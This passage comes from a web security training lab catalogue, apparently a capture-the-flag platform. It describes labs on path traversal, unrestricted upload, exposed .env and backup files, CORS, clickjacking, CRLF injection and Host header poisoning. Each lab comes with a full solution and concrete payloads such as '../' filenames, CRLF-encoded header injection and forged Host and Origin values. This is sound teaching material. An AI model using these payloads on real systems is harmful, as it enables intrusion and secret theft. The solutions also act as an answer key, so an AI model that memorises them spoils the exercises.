- **Threat mapping:** A05:2021 - Security Misconfiguration; ASVS V12.3.1; WSTG-BUSL-09; CWE-22; MITRE ATT&CK T1083

The upload filename is joined onto a directory with no containment check.

**Briefing:** The upload handler joins the supplied filename onto the uploads directory without resolving or validating the final path. A filename containing ../ can write into the protected directory.

**Objectives:**
- Identify path traversal in a filename
- Write a file outside the uploads directory
- Demonstrate access to the protected folder and capture the flag

**Hints:**
1. The filename is placed in the query string and passed to path.join.
2. Use a filename such as ../protected/audit.txt.

**Solution:** Upload with filename=../protected/audit.txt. The file lands in the protected directory, and the lab index detects the escaped write and returns the flag.

### 48. File Upload: Unrestricted Upload to Code Execution

- **Slug:** `upload-unrestricted-rce`
- **Path:** `/labs/upload-unrestricted-rce`
- **Domain / category:** File Upload / Security Misconfiguration
- **Difficulty:** Hard (L4), 350 points
- **Estimated time:** 40 minutes
- **Technology:** Node.js, Express, vm, File uploads
- **Prerequisites:** `upload-path-traversal`
- **Threat mapping:** A05:2021 - Security Misconfiguration; ASVS V12.2.1; WSTG-BUSL-09; CWE-434; MITRE ATT&CK T1059

Any file type is accepted, and plugins are executed server-side.

**Briefing:** The plugin manager accepts JavaScript files and executes them in a sandbox when you click Run. A reportFlag(value) function is in scope. Upload a plugin that calls reportFlag with the required value.

**Objectives:**
- Confirm that uploaded JavaScript is executed server-side
- Understand the capability exposed to uploaded code
- Invoke reportFlag to reveal the flag

**Hints:**
1. Upload a .js file containing reportFlag("confirm") and click Run.
2. The sandbox exposes reportFlag but no Node.js require.

**Solution:** Upload a JavaScript file whose content is reportFlag("confirm"), then POST /run/<id>. The plugin executor calls reportFlag with the accepted value and returns the flag.

### 49. Verbose Error Messages

- **Slug:** `disclosure-verbose-errors`
- **Path:** `/labs/disclosure-verbose-errors`
- **Domain / category:** Information Disclosure / Security Misconfiguration
- **Difficulty:** Beginner (L1), 100 points
- **Estimated time:** 15 minutes
- **Technology:** Node.js, Express, JSON
- **Prerequisites:** None
- **Threat mapping:** A05:2021 - Security Misconfiguration; ASVS V7.4.1; WSTG-ERRH-01; CWE-209; MITRE ATT&CK T1592

Unhandled exceptions return their full message and stack.

**Briefing:** The lookup endpoint parses JSON and returns raw error stacks on failure. Trigger an exception and inspect the stack trace for internal configuration, including the flag.

**Objectives:**
- Trigger an unhandled exception
- Read the stack trace and internal configuration
- Recover the flag from the error output

**Hints:**
1. Submit an empty ID or an invalid JSON value to the lookup form.
2. The error output includes JSON.stringify(INTERNAL_CONFIG), which contains the flag.

**Solution:** Submit an empty ID to /labs/disclosure-verbose-errors/lookup. The thrown error includes the internal configuration object with debugFlag, which is the flag.

### 50. Exposed .env Configuration File

- **Slug:** `disclosure-env-file`
- **Path:** `/labs/disclosure-env-file`
- **Domain / category:** Information Disclosure / Security Misconfiguration
- **Difficulty:** Beginner (L1), 100 points
- **Estimated time:** 15 minutes
- **Technology:** Node.js, Express
- **Prerequisites:** None
- **Threat mapping:** A05:2021 - Security Misconfiguration; ASVS V14.3.2; WSTG-CONF-02; CWE-538; MITRE ATT&CK T1552.001

Static file serving exposes the app configuration directory.

**Briefing:** The lab app serves a configuration directory as static content, including a generated production .env file. Request it directly.

**Objectives:**
- Discover exposed configuration files
- Request the generated .env file
- Extract the flag from its contents

**Hints:**
1. Configuration files are often left in the web root.
2. Request /labs/disclosure-env-file/.env.

**Solution:** Request /labs/disclosure-env-file/.env. The generated file contains a debug secret whose value is the instance flag.

### 51. Leftover Backup File Disclosure

- **Slug:** `disclosure-backup-file`
- **Path:** `/labs/disclosure-backup-file`
- **Domain / category:** Information Disclosure / Security Misconfiguration
- **Difficulty:** Beginner (L1), 100 points
- **Estimated time:** 15 minutes
- **Technology:** Node.js, Express, Static files
- **Prerequisites:** None
- **Threat mapping:** A05:2021 - Security Misconfiguration; ASVS V14.3.2; WSTG-CONF-04; CWE-538; MITRE ATT&CK T1083

An old .bak copy of a source file was left in the public directory.

**Briefing:** A billing JavaScript file is served publicly. If a developer left billing.js.bak next to it, the backup may be served just as plainly. Request it and inspect the embedded configuration.

**Objectives:**
- Enumerate backup and editor artifacts
- Request the .bak file
- Recover the flag from the backup source

**Hints:**
1. If billing.js exists, check billing.js.bak.
2. Request /labs/disclosure-backup-file/billing.js.bak.

**Solution:** Request /labs/disclosure-backup-file/billing.js.bak. The backup contains a development config object with the flag.

### 52. Exposed Source Map

- **Slug:** `disclosure-source-map`
- **Path:** `/labs/disclosure-source-map`
- **Domain / category:** Information Disclosure / Security Misconfiguration
- **Difficulty:** Easy (L2), 150 points
- **Estimated time:** 25 minutes
- **Technology:** Node.js, Express, JavaScript source maps
- **Prerequisites:** `disclosure-backup-file`
- **Threat mapping:** A05:2021 - Security Misconfiguration; ASVS V14.3.2; WSTG-CONF-04; CWE-540; MITRE ATT&CK T1083

A production JavaScript bundle ships with its source map still public.

**Briefing:** The production bundle references a .map file. The map includes sourcesContent, allowing you to reconstruct the original source. Find the secret that should never have shipped.

**Objectives:**
- Read the sourceMappingURL from the bundle
- Fetch and parse the source map
- Recover the flag from sourcesContent

**Hints:**
1. Check the last line of /labs/disclosure-source-map/js/app.bundle.js.
2. Fetch the sourceMappingURL and inspect the sourcesContent array.

**Solution:** Fetch /labs/disclosure-source-map/js/app.bundle.js.map and inspect sourcesContent. The original source contains a private config object with the flag.

### 53. Insecure CORS with Credentials

- **Slug:** `cors-wildcard-credentials`
- **Path:** `/labs/cors-wildcard-credentials`
- **Domain / category:** CORS & Security Headers / Security Misconfiguration
- **Difficulty:** Intermediate (L3), 250 points
- **Estimated time:** 30 minutes
- **Technology:** Node.js, Express, CORS
- **Prerequisites:** `api-bola`
- **Threat mapping:** A05:2021 - Security Misconfiguration; ASVS V14.5.3; WSTG-CLNT-11; CWE-942; MITRE ATT&CK T1185

The API reflects any Origin and allows credentials.

**Briefing:** The API reflects the caller Origin into Access-Control-Allow-Origin and sets Access-Control-Allow-Credentials: true. A page on any origin can read the authenticated response. Make a cross-origin request with a foreign Origin and recover the flag.

**Objectives:**
- Inspect CORS response headers
- Send a request with a foreign Origin and credentials
- Read the protected API response and capture the flag

**Hints:**
1. Send an Origin header such as http://evil.example to /labs/cors-wildcard-credentials/api/secret.
2. The response reflects that origin and allows credentials. A foreign origin can read apiKey and flag.

**Solution:** Request /labs/cors-wildcard-credentials/api/secret with Origin: http://evil.example and the lab session cookie. The API reflects the origin, allows credentials, and returns the flag.

### 54. Clickjacking via Missing Frame Protection

- **Slug:** `clickjacking-missing-xfo`
- **Path:** `/labs/clickjacking-missing-xfo`
- **Domain / category:** CORS & Security Headers / Security Misconfiguration
- **Difficulty:** Easy (L2), 150 points
- **Estimated time:** 25 minutes
- **Technology:** Node.js, Express, HTML iframes
- **Prerequisites:** `csrf-email-change`
- **Threat mapping:** A05:2021 - Security Misconfiguration; ASVS V14.4.1; WSTG-CLNT-09; CWE-1021; MITRE ATT&CK T1185

No X-Frame-Options or CSP frame-ancestors is set.

**Briefing:** The account page can be embedded in a cross-origin iframe. The simulated attacker page frames the delete-account button under a prize button. Trigger a deletion from inside the frame and capture the flag.

**Objectives:**
- Confirm the target can be framed
- Understand how an overlay steals a click
- Trigger the framed action and recover the flag

**Hints:**
1. Open /labs/clickjacking-missing-xfo/attacker-page and inspect the invisible iframe.
2. The framed delete form includes a frame marker. Submit it from the frame to trigger the reward.

**Solution:** Open the attacker page, click the overlay, and let the framed POST /delete-account run. The lab validates the iframe context and returns the flag.

### 55. CRLF Injection / Response Splitting

- **Slug:** `crlf-header-injection`
- **Path:** `/labs/crlf-header-injection`
- **Domain / category:** CORS & Security Headers / Injection
- **Difficulty:** Hard (L4), 350 points
- **Estimated time:** 40 minutes
- **Technology:** Node.js, Express, HTTP
- **Prerequisites:** `cors-wildcard-credentials`
- **Threat mapping:** A03:2021 - Injection; ASVS V5.3.2; WSTG-INPV-15; CWE-113; MITRE ATT&CK T1190

A redirect target is written into a raw header with no CRLF stripping.

**Briefing:** The redirect endpoint writes the dest parameter into a raw HTTP response header. Inject a CRLF sequence to smuggle extra headers into the response, then retrieve the flag.

**Objectives:**
- Understand CRLF and HTTP response splitting
- Inject an extra response header through dest
- Trigger the flag endpoint after a successful split

**Hints:**
1. The dest value is written after Location: without stripping CR or LF.
2. Use %0d%0aSet-Cookie:%20pwned=1 in dest and inspect the raw response with curl -i.

**Solution:** Send /labs/crlf-header-injection/go?dest=%0d%0aSet-Cookie:%20pwned=1%0d%0aX-Injected:%20yes. The raw response includes the injected headers, the lab marks the split, and /flag returns the flag.

### 56. Host Header Poisoning

- **Slug:** `host-header-poisoning`
- **Path:** `/labs/host-header-poisoning`
- **Domain / category:** CORS & Security Headers / Security Misconfiguration
- **Difficulty:** Intermediate (L3), 250 points
- **Estimated time:** 30 minutes
- **Technology:** Node.js, Express, HTTP headers
- **Prerequisites:** `csrf-get-based`
- **Threat mapping:** A05:2021 - Security Misconfiguration; ASVS V14.4.1; WSTG-CONF-07; CWE-644; MITRE ATT&CK T1190

Password reset links are built from the incoming Host header.

**Briefing:** The password reset service constructs the reset link from the request Host header. Send a reset request with a forged Host value and make the generated link point to an attacker domain.

**Objectives:**
- Inspect how absolute URLs are generated
- Send a reset request with a forged Host header
- Poison the reset link and capture the flag

**Hints:**
1. Use curl with an explicit Host header, or a proxy that lets you edit Host.
2. Send Host: evil-attacker.test to POST /labs/host-header-poisoning/request-reset.

**Solution:** Send POST /labs/host-header-poisoning/request-reset with Host: evil-attacker.test. The generated reset link uses the forged host, and the response includes the flag.

